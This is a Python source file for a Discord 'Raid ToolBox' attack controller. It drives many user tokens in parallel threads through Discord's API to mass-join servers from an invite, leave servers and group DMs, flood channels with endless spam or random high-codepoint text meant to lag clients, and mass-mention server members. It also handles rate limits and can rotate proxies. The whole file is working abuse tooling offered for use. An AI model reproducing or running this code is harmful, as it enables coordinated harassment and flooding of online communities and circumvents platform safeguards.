#!/usr/bin/env python3
# Raid ToolBox Attack Controller
# Author: DeadBread76 - https://github.com/DeadBread76/
# July 3rd, 2019 - July , 2019
#
# Copyright (c) 2019, DeadBread
#
# Permission to use, copy, modify, and/or distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY
# SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION
# OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
# CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

import os
import sys
import ast
import zlib
import json
import time
import random
import requests
import PySimpleGUI as sg
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor
from websocket import create_connection


executor = ThreadPoolExecutor(max_workers=800)
mode = sys.argv[1]
pycommand = sys.argv[2]
useproxies = sys.argv[3]

if useproxies == 'True':
    if not os.path.exists('proxies.txt'):
        with open ("proxies.txt","a+") as handle:
            handle.write('\n')
        sys.exit()
    else:
        with open ("proxies.txt", "r") as handle:
            proxies = handle.read().split("\n")
        proxy_pool = cycle(proxies)

true = 'true'
false = 'false'

def asciigen(length):
    asc = ''
    for x in range(int(length)):
        num = random.randrange(13000)
        asc = asc + chr(num)
    return asc

if mode == 'joiner':
    def join(token,link,proxy):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.post("https://discordapp.com/api/v6/invite/{}".format(str(link)), headers=headers)
    tokenlist = open("tokens.txt").read().splitlines()
    link = sg.PopupGetText('Enter The Discord Invite to join.', "RTB | Server Joiner")
    if link == None:
        sys.exit()
    else:
        if 'https://discordapp.com/invite/' in link:
            link = link[30:]
        elif len(link) > 7:
            link = link[19:]
        for token in tokenlist:
            executor.submit(join,token,link,None)

elif mode == 'clijoiner':
    def join(token,link,proxy):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.post("https://discordapp.com/api/v6/invite/{}".format(str(link)), headers=headers)
    tokenlist = open("tokens.txt").read().splitlines()
    link = sys.argv[4]
    if link == '':
        sys.exit()
    else:
        if 'https://discordapp.com/invite/' in link:
            link = link[30:]
        elif len(link) > 7:
            link = link[19:]
        for token in tokenlist:
            executor.submit(join,token,link,None)

elif mode == 'leaver':
    def leave(token,ID,proxy):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.delete("https://discordapp.com/api/v6/users/@me/guilds/{}".format(str(ID)), headers=headers)
    tokenlist = open("tokens.txt").read().splitlines()
    ID = sg.PopupGetText('Enter ID of the server to leave.', "RTB | Server Leaver")
    if ID == None:
        sys.exit()
    for token in tokenlist:
        executor.submit(leave,token,ID,None)

elif mode == 'clileaver':
    def leave(token,ID,proxy):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.delete("https://discordapp.com/api/v6/users/@me/guilds/{}".format(str(ID)), headers=headers)
    tokenlist = open("tokens.txt").read().splitlines()
    ID = sys.argv[4]
    for token in tokenlist:
        executor.submit(leave,token,ID,None)

elif mode == 'groupleaver':
    def grleave(token,ID,proxy):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.delete("https://discordapp.com/api/v6/channels/{}".format(str(ID)), headers=headers)
    tokenlist = open("tokens.txt").read().splitlines()
    ID = sg.PopupGetText('Enter ID of the group to leave.', "RTB | Group DM Leaver")
    if ID == None:
        sys.exit()
    for token in tokenlist:
        executor.submit(grleave,token,ID,None)

elif mode == 'cligroupleaver':
    def grleave(token,ID,proxy):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.delete("https://discordapp.com/api/v6/channels/{}".format(str(ID)), headers=headers)
    tokenlist = open("tokens.txt").read().splitlines()
    ID = sys.argv[4]
    for token in tokenlist:
        executor.submit(grleave,token,ID,None)

elif mode == 'messagespam':
    def sendmessage(token,text,channel,server,proxy):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        payload = {"content" : text,"tts" : false}
        if channel == 'all':
            chanjson = requests.get("https://discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if "You are being rate limited." in str(src.content):
                            time.sleep(5)
        else:
            headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            payload = {"content" : text,"tts" : false}
            while True:
                src = requests.post("https://discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if "You are being rate limited." in str(src.content):
                    time.sleep(5)
    layout = [
          [sg.Text('Text To Spam', size=(15, 1)), sg.InputText()],
          [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
          [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
          [sg.OK(), sg.Cancel()]
         ]
    window = sg.Window('RTB | Message Spammer', layout)
    event, values = window.Read()
    window.Close()
    text = values[0]
    channelid = values[1]
    SERVER = values[2]
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        executor.submit(sendmessage,token,text,channelid,SERVER,None)

elif mode == 'climessagespam':
    def sendmessage(token,text,channel,server,proxy):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        payload = {"content" : text,"tts" : false}
        if channel == 'all':
            chanjson = requests.get("https://discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if "You are being rate limited." in str(src.content):
                            time.sleep(5)
        else:
            headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            payload = {"content" : text,"tts" : false}
            while True:
                src = requests.post("https://discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if "You are being rate limited." in str(src.content):
                    time.sleep(5)
    text = sys.argv[4]
    channelid = sys.argv[5]
    SERVER = sys.argv[6]
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        executor.submit(sendmessage,token,text,channelid,SERVER,None)

elif mode == 'asciispam':
    def sendascii(token,channel,server,proxy):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if channel == 'all':
            chanjson = requests.get("https://discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    payload = {"content" : asciigen(1999),"tts" : false}
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if "You are being rate limited." in str(src.content):
                            time.sleep(5)
        else:
            headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            payload = {"content" : text,"tts" : false}
            while True:
                payload = {"content" : asciigen(1999),"tts" : false}
                src = requests.post("https://discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if "You are being rate limited." in str(src.content):
                    time.sleep(5)
    layout = [[sg.Text('WARNING: This will make your Discord client lag by just looking at the channel,\nI recommend not looking at the channels while doing this attack.')],
          [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
          [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
          [sg.OK(), sg.Cancel()]
         ]
    window = sg.Window('RTB | Ascii Spammer', layout)
    event, values = window.Read()
    window.Close()
    channelid = values[0]
    SERVER = values[1]
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        executor.submit(sendascii,token,channelid,SERVER,None)

elif mode == 'cliasciispam':
    def sendascii(token,channel,server,proxy):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if channel == 'all':
            chanjson = requests.get("https://discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    payload = {"content" : asciigen(1999),"tts" : false}
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if "You are being rate limited." in str(src.content):
                            time.sleep(5)
        else:
            headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            payload = {"content" : text,"tts" : false}
            while True:
                payload = {"content" : asciigen(1999),"tts" : false}
                src = requests.post("https://discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if "You are being rate limited." in str(src.content):
                    time.sleep(5)
    channelid = sys.argv[4]
    SERVER = sys.argv[5]
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        executor.submit(sendascii,token,channelid,SERVER,None)

elif mode == 'massmention':
    def sendmention(token,channel,server,proxy):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        memberlist = []
        msg = ''
        memb = requests.get("https://discordapp.com/api/v6/guilds/{}/members?limit=1000".format(server),headers=headers).text
        memberjson = json.loads(memb)
        for member in memberjson:
            memberlist.append("<@{}>".format(member['user']['id']))
        for member in memberlist:
            msg += member + ' '
        if channel == 'all':
            chanjson = requests.get("https://discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    if not channel['type'] == 0:
                        continue
                    else:
                        for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                            src = requests.post("https://discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json={"content" : m,"tts" : false})
                            if "You are being rate limited." in str(src.content):
                                time.sleep(5)
        else:
            headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            while True:
                for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                    src = requests.post("https://discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json={"content" : m,"tts" : false})
                    if "You are being rate limited." in str(src.content):
                        time.sleep(5)
    layout = [
          [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
          [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
          [sg.OK(), sg.Cancel()]
          ]
    window = sg.Window('RTB | Mass Mentioner', layout)
    event, values = window.Read()
    window.Close()
    SERVER = values[0]
    channelid = values[1]
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        executor.submit(sendmention,token,channelid,SERVER,None)
